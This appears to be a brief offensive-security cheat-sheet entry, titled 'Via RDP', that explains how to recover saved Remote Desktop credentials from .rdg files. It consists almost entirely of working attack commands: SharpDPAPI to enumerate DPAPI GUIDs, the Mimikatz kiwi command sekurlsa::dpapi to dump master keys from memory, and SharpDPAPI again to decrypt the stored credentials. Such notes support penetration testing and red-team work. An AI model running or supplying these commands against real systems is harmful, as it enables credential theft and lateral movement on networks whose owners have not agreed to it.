# Via RDP 

- Find the .rdg file in system
- Use SharpDPAPI.exe to Enumerate GUID
```
SharpDPAPI.exe rdg /unprotected
```
- Dump GUID Masterkey with kiwi
```
kiwi_cmd sekurlsa::dpapi
```
- Utlize the GUID and Masterkey to gain Credentials
```
SharpDPAPI.exe rdg GUID:sha(masterkey)
```
